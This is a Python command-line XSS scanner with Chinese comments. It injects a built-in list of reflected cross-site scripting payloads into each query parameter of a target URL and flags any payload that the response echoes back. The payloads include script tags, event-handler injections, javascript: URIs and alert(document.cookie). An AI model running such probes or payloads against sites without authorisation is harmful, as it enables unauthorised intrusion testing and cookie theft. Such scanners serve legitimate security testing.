#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode
import requests
import argparse


class Xss_scanner:
    def __init__(self,url,payload,timeout):
        self.url=url
        self.payload=payload
        self.timeout=timeout
    def scan_xss(self):
        # 常见XSS Payload列表
        payloads = [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "';alert(1);'",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "javascript:alert(1)",
            "javascript%3Aalert(1)",
            "javascript%3A%0Aalert(1)",
            "javascript%0Aalert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "javascript:alert(document.cookie)",
            "<img src=x onerror=alert(document.cookie)>"
        ]

        # 如果指定了自定义payload文件，加载自定义payload
        if self.payload != 'default':
            try:
                with open(self.payload, 'r') as f:
                    payloads = [line.strip() for line in f.readlines()]
                print(f"[+] 使用自定义payload文件: {self.payload}")
            except Exception as e:
                print(f"[-] 无法加载自定义payload文件: {e}")
                sys.exit(1)

        url = self.url

        print(f"[*] 正在扫描目标: {url}")

        # 拆分URL
        parsed_url = urlparse(url)

        # 检查URL是否包含参数
        if not parsed_url.query:
            print("[-] 目标URL没有查询参数，无法进行XSS扫描")
            sys.exit(0)

        # 提取URL参数
        query_params = parse_qs(parsed_url.query)

        # 扫描每个参数
        for param in query_params:
            print(f"\n[+] 正在测试参数: {param}")

            # 对每个payload进行测试
            for payload in payloads:
                # 复制参数字典，避免修改原始数据
                test_params = query_params.copy()

                # 替换当前参数的值为payload
                test_params[param] = [payload]

                # 重构URL
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params, doseq=True)}"

                print(f"    [-] 测试payload: {payload}")

                try:
                    # 发送请求
                    response = requests.get(test_url, timeout=self.timeout)

                    # 检查响应中是否包含payload
                    if payload in response.text:
                        print(f"    [+] 检测到XSS漏洞! payload: {payload}")
                        print(f"    [+] 测试URL: {test_url}")
                    else:
                        print(f"    [-] 未检测到漏洞: {payload}")

                except Exception as e:
                    print(f"    [-] 请求错误: {str(e)}")

        print("\n[+] 扫描完成!")
def main():
    # 设置命令行参数
    parser = argparse.ArgumentParser(description='XSS漏洞扫描器')
    parser.add_argument('-u', '--url', required=True, help='目标URL')
    parser.add_argument('-p', '--payload', default='default', help='自定义payload文件（可选）')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='请求超时时间(秒)')
    args = parser.parse_args()
    xss_scanner=Xss_scanner(args.url,args.payload,args.timeout)
    xss_scanner.scan_xss()

if __name__ == "__main__":
    main()